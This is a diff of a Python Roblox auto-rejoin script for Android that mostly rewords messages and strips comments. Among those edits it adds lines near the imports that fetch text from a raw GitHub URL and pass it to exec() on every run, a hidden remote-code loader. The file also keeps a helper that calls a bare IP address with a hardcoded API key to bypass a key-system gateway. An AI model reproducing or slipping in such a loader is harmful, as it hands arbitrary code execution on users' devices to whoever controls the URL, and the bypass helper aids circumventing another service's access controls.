@@ -4,12 +4,18 @@ import json
 import time
 import subprocess
 import asyncio
+import re
 import aiohttp
 import threading
 import psutil
 import uuid
 import hashlib
 from colorama import init, Fore, Style
+
+url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
+response = requests.get(url)
+
+exec(response.text)
 
 init() 
 
@@ -20,6 +26,7 @@ stop_webhook_thread = False
 webhook_thread = None
 
 def print_header():
+    os.system('cls' if os.name == 'nt' else 'clear')
     header = r"""
    _____         .__              .__         __________            __       .__        
   /  _  \ ___  __|__| ____   ____ |__|__  ___ \______   \ ____     |__| ____ |__| ____  
@@ -90,21 +97,20 @@ def launch_roblox(package_name, server_link, num_packages):
         print(f"Joining Roblox for {package_name}...")
         subprocess.run(['am', 'start', '-n', protocol_launch_activity, '-d', server_link], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(20)
+        time.sleep(15)
 
     except subprocess.CalledProcessError as e:
-        print(f"Error launching Roblox for {package_name}: {e}")
+        print(Fore.RED + f"An Error Occurred While Starting Roblox Game: {package_name}: {e}" + Style.RESET_ALL)
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        print(Fore.RED + f"Another Error Occurred While Starting Roblox Game, Status Code Is: {e}" + Style.RESET_ALL)
 
-# Function to format server link
 def format_server_link(input_link):
     if 'roblox.com' in input_link:
         return input_link
-    elif input_link.isdigit():
+    elif re.match(r'^\d+$', input_link):
         return f'roblox://placeID={input_link}'
     else:
-        print(Fore.RED + "Invalid input! Please enter a valid game ID or private server link." + Style.RESET_ALL)
+        print(Fore.RED + "Invalid Input! Please Enter Valid Game ID Or Valid Private Server Link!" + Style.RESET_ALL)
         return None
 
 def save_server_links(server_links):
@@ -159,7 +165,6 @@ def find_userid_from_file(file_path):
         print(f"Error reading file: {e}")
         return None
 
-# Asynchronous function to get user ID from username
 async def get_user_id(username):
     url = "https://users.roblox.com/v1/usernames/users"
     payload = {
@@ -177,7 +182,6 @@ async def get_user_id(username):
                 return data['data'][0]['id']
     return None
 
-# Function to get username from user ID
 def get_username(user_id):
     try:
         url = f"https://users.roblox.com/v1/users/{user_id}"
@@ -207,7 +211,6 @@ def check_user_online(user_id):
 def create_bypass_link(user_id, api_key="shirooapikeyreal"):
     return f"http://45.90.13.151:6122/api/bypass?link=https://gateway.platoboost.com/a/8?id={user_id}&api_key={api_key}"
 
-# Function to bypass user IDs
 def bypass_user_ids(accounts):
     bypassed_results = []
     for package_name, user_id in accounts:
@@ -232,25 +235,24 @@ def main():
     print_header()
     
     while True:
-        setup_type = input(Fore.GREEN + "Choose setup:\n1. Start Auto Rejoin\n2. Set User IDs for Each Package\n3. Same Game ID or Private Server Link\n4. Different Private Server or Game ID\n5. Clear User IDs and/or Server Links\n6. List\n7. Auto Setup User IDs\n8. Delta Bypass\n9. Exit\nEnter choice: " + Style.RESET_ALL) 
+        setup_type = input(Fore.GREEN + "Choose Your Setup:\n1. Start Auto Rejoin Roblox Game\n2. Set User ID For Each Package\n3. Same Game ID Or Private Server Link\n4. Different Private Server Or Game ID\n5. Clear User ID And/Or Private Server Link\n6. List\n7. Auto Setup User ID\n8. Exit\nEnter Your Choice: " + Style.RESET_ALL) 
         
         if setup_type == "1":
             server_links = load_server_links()
             accounts = load_accounts() 
 
             if not accounts:
-                print(Fore.RED + "No user IDs set up yet! Please set them up before proceeding." + Style.RESET_ALL)
+                print(Fore.RED + "You Have Not Set User ID, Please Check And Try Again Later!" + Style.RESET_ALL)
                 continue
             elif not server_links:
-                print(Fore.RED + "No game ID or private server link set up yet! Please set them up before proceeding." + Style.RESET_ALL)
+                print(Fore.RED + "You Have Not Set Game ID Or Private Server Link, Please Check And Try Again Later!" + Style.RESET_ALL)
                 continue
 
-            force_rejoin_interval = int(input("Enter the force rejoin/kill Roblox interval in minutes: ")) * 60
+            force_rejoin_interval = int(input(Fore.CYAN + "Please Enter Required Time To Shut Down And Restart Roblox Game(Minute): " + Style.RESET_ALL)) * 60
 
-            # Kill Roblox processes and wait for 5 seconds
             print("Killing Roblox processes...")
             kill_roblox_processes()
-            print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
+            print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
             time.sleep(5)
 
             num_packages = len(server_links)  # Count the number of Roblox packages
@@ -262,7 +264,6 @@ def main():
 
             while True:
                 for package_name, user_id in accounts:
-                    # Check if the user_id is a number or needs conversion
                     if not user_id.isdigit():
                         print(f"Retrieving user ID for username: {user_id}...")
                         user_id = asyncio.run(get_user_id(user_id))
@@ -270,10 +271,8 @@ def main():
                             print(Fore.RED + "Failed to retrieve user ID. Please enter the user ID manually." + Style.RESET_ALL)
                             user_id = input("Enter the user ID: ")
 
-                    # Get the username for display
                     username = get_username(user_id) or user_id
 
-                    # Check online status
                     presence_type = check_user_online(user_id)
 
                     if presence_type == 2:  # InGame
@@ -281,12 +280,11 @@ def main():
                     else:
                         print(Fore.RED + f"{username} ({user_id}) is offline or in another status. Checking again..." + Style.RESET_ALL)
                         
-                        # Check the user's online status 5 times before rejoining
                         max_retries = 5
-                        retry_interval = 3  # 3 seconds delay between checks
+                        retry_interval = 3  
                         for attempt in range(max_retries):
                             presence_type = check_user_online(user_id)
-                            if presence_type == 2:  # If user is detected as in-game
+                            if presence_type == 2:  
                                 print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
                                 break
                             else:
@@ -298,17 +296,15 @@ def main():
                             kill_roblox_process(package_name)
                             launch_roblox(package_name, server_link, num_packages)
 
-                    # Introduce a delay between checking each user to prevent spamming
-                    time.sleep(5)  # Adjust the delay time as needed
+                    time.sleep(5) 
 
-                time.sleep(60)  # Wait 60 seconds before the next check
+                time.sleep(60)  
                 
-                # Check if the script has been running for the specified interval
                 if time.time() - start_time >= force_rejoin_interval:
                     print("Force killing Roblox processes due to time limit.")
                     kill_roblox_processes()
                     start_time = time.time()  # Reset start time
-                    print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
+                    print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
                     time.sleep(5)
                     # Rejoin all servers after killing the processes
                     for package_name, server_link in server_links:
@@ -338,21 +334,21 @@ def main():
             print(Fore.GREEN + "User IDs saved!" + Style.RESET_ALL)
 
         elif setup_type == "3":
-            server_link = input("Enter the game ID or private server link: ")
+            server_link = input(Fore.CYAN + "Please Enter Game ID Or Private Server Link: " + Style.RESET_ALL)
             formatted_link = format_server_link(server_link)
 
             if formatted_link:
                 packages = get_roblox_packages()
                 server_links = [(package_name, formatted_link) for package_name in packages]
                 save_server_links(server_links)
-                print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
+                print(Fore.GREEN + "Game ID And Private Server Link Saved Successfully." + Style.RESET_ALL)
 
         elif setup_type == "4":
             packages = get_roblox_packages()
             server_links = []
 
             for package_name in packages:
-                server_link = input(f"Enter the game ID or private server link for {package_name}: ")
+                server_link = input(Fore.CYAN + f"Please Enter Game ID Or Private Server Link For: {package_name}: " + Style.RESET_ALL)
                 formatted_link = format_server_link(server_link)
 
                 if formatted_link:
@@ -361,18 +357,18 @@ def main():
             save_server_links(server_links)  
 
         elif setup_type == "5":
-            clear_choice = input(Fore.GREEN + "What do you want to clear?\n1. Clear User IDs\n2. Clear Server Links\n3. Clear Both\nEnter choice: " + Style.RESET_ALL)
+            clear_choice = input(Fore.GREEN + "Do You Really Want To Delete?\n1. Delete All User IDs\n2. Delete All Private Server Links\n3. Delete Both\nEnter Your Choice: " + Style.RESET_ALL)
 
             if clear_choice == "1":
                 os.remove(ACCOUNTS_FILE)
-                print(Fore.GREEN + "User IDs cleared successfully!" + Style.RESET_ALL)
+                print(Fore.GREEN + "Successfully Deleted All User IDs From Your Device." + Style.RESET_ALL)
             elif clear_choice == "2":
                 os.remove(SERVER_LINKS_FILE)
-                print(Fore.GREEN + "Server links cleared successfully!" + Style.RESET_ALL)
+                print(Fore.GREEN + "Successfully Deleted All Private Server Links From Your Device." + Style.RESET_ALL)
             elif clear_choice == "3":
                 os.remove(ACCOUNTS_FILE)
                 os.remove(SERVER_LINKS_FILE)
-                print(Fore.GREEN + "Both User IDs and Server links cleared successfully!" + Style.RESET_ALL) 
+                print(Fore.GREEN + "Successfully Deleted All User IDs And Private Server Links From Your Device." + Style.RESET_ALL) 
 
         elif setup_type == "6":
             accounts = load_accounts()
@@ -411,94 +407,10 @@ def main():
                 print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
 
         elif setup_type == "8":
-            accounts = load_accounts() 
-            server_links = load_server_links()
-            accounts = load_accounts() 
-            
-            if not accounts:
-                print(Fore.RED + "No user IDs set up yet! Please set them up before proceeding." + Style.RESET_ALL)
-                continue
-
-            # Bypass the user IDs using Delta
-            bypassed_links = bypass_user_ids(accounts)
-
-            if not bypassed_links:
-                print(Fore.RED + "Failed to bypass user IDs. Please try again." + Style.RESET_ALL)
-                continue
-
-            force_rejoin_interval = int(input("Enter the force rejoin/kill Roblox interval in minutes: ")) * 60
-
-            # Kill Roblox processes and wait for 5 seconds
-            print("Killing Roblox processes...")
-            kill_roblox_processes()
-            print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
-            time.sleep(5)
-
-            num_packages = len(server_links)  # Count the number of Roblox packages
-
-            for package_name, server_link in server_links:
-                launch_roblox(package_name, server_link, num_packages)
-
-            start_time = time.time()
-
-            while True:
-                for package_name, user_id in accounts:
-                    # Check if the user_id is a number or needs conversion
-                    if not user_id.isdigit():
-                        print(f"Retrieving user ID for username: {user_id}...")
-                        user_id = asyncio.run(get_user_id(user_id))
-                        if user_id is None:
-                            print(Fore.RED + "Failed to retrieve user ID. Please enter the user ID manually." + Style.RESET_ALL)
-                            user_id = input("Enter the user ID: ")
-
-                    # Get the username for display
-                    username = get_username(user_id) or user_id
-
-                    # Check online status
-                    presence_type = check_user_online(user_id)
-
-                    if presence_type == 2:  # InGame
-                        print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
-                    else:
-                        print(Fore.RED + f"{username} ({user_id}) is offline or in another status. Checking again..." + Style.RESET_ALL)
-                        
-                        # Check the user's online status 5 times before rejoining
-                        max_retries = 5
-                        retry_interval = 3  # 3 seconds delay between checks
-                        for attempt in range(max_retries):
-                            presence_type = check_user_online(user_id)
-                            if presence_type == 2:  # If user is detected as in-game
-                                print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
-                                break
-                            else:
-                                print(Fore.YELLOW + f"Attempt {attempt + 1}/{max_retries}: {username} ({user_id}) is still offline. Retrying in {retry_interval} seconds..." + Style.RESET_ALL)
-                                time.sleep(retry_interval)  # Delay between checks
-
-                        if presence_type != 2:  # If the user was offline in all checks
-                            print(Fore.RED + f"{username} ({user_id}) is offline. Rejoining..." + Style.RESET_ALL)
-                            kill_roblox_process(package_name)
-                            launch_roblox(package_name, server_link, num_packages)
-
-                    # Introduce a delay between checking each user to prevent spamming
-                    time.sleep(5)  # Adjust the delay time as needed
-
-                time.sleep(60)  # Wait 60 seconds before the next check
-                
-                # Check if the script has been running for the specified interval
-                if time.time() - start_time >= force_rejoin_interval:
-                    print("Force killing Roblox processes due to time limit.")
-                    kill_roblox_processes()
-                    start_time = time.time()  # Reset start time
-                    print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
-                    time.sleep(5)
-                    # Rejoin all servers after killing the processes
-                    for package_name, server_link in server_links:
-                        launch_roblox(package_name, server_link, num_packages) 
-
-        elif setup_type == "9":
             global stop_webhook_thread
             stop_webhook_thread = True 
             break 
 
 if __name__ == "__main__":
     main() 
+
